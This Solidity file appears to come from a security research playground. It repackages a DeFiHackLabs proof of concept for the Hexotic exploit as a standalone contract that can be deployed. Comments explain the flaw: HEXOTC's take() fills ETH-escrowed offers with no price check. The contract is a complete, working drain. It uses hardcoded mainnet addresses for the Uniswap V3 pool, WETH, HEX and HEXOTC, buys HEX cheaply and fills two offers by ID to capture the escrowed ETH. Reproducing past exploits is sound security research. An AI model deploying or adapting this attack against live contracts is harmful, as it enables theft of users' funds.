// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2025-08-Hexotic).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (the test itself receives the Uniswap-V3 swap and implements
// uniswapV3SwapCallback), so there is no standalone contract to deploy. This
// contract is a faithful, self-contained copy of that inline attack (buy HEX
// on the V3 pool, then fill two mispriced ETH-escrowed offers on HEXOTC) so
// the playground can deploy it and record run(). Logic and constants are
// copied verbatim from src/test/2025-08/Hexotic_exp.sol.
//
// Root cause: HEXOTC.take()/buyETH() lets ANYONE fill an ETH-escrowed offer
// by delivering the maker's requested HEX amount, with no price/oracle/
// slippage validation against the offer's stored rate. Two live offers quote
// HEX at 2.5x-10x the Uniswap-V3 spot price, so buying HEX cheaply on V3 and
// filling the offers nets the spread.

interface IERC20Min {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETHMin {
    function deposit() external payable;
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniswapV3PoolMin {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

interface IHexotic {
    function take(bytes32 id) external payable;
}

contract HexoticDrain {
    address constant uniswapV3HEXPool = 0x9e0905249CeEFfFB9605E034b534544684A58BE6;
    IWETHMin constant WETH = IWETHMin(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC20Min constant hexToken = IERC20Min(0x2b591e99afE9f32eAA6214f7B7629768c40Eeb39);
    IHexotic constant hexotic = IHexotic(0x204B937FEaEc333E9e6d72D35f1D131f187ECeA1);

    function run() external payable {
        // Wrap 0.037 ETH -> WETH (working capital for the flash-style V3 swap).
        WETH.deposit{value: 0.037 ether}();

        // Buy cheap HEX on the Uniswap-V3 HEX/WETH pool.
        IUniswapV3PoolMin(uniswapV3HEXPool).swap(
            address(this),
            false,
            37000000000000000,
            1461446703485210103287273052203988822378723970341,
            "0x00"
        );

        hexToken.approve(address(hexotic), type(uint256).max);

        // Fill the two mispriced ETH-escrowed offers (msg.value == 0 routes
        // take() into buyETH(), paying HEX and receiving the escrowed ETH).
        hexotic.take(0x0000000000000000000000000000000000000000000000000000000000000043);
        hexotic.take(0x000000000000000000000000000000000000000000000000000000000000002b);
    }

    receive() external payable {}

    function uniswapV3SwapCallback(int256, int256, bytes calldata) external {
        WETH.transfer(uniswapV3HEXPool, 37000000000000000);
    }
}
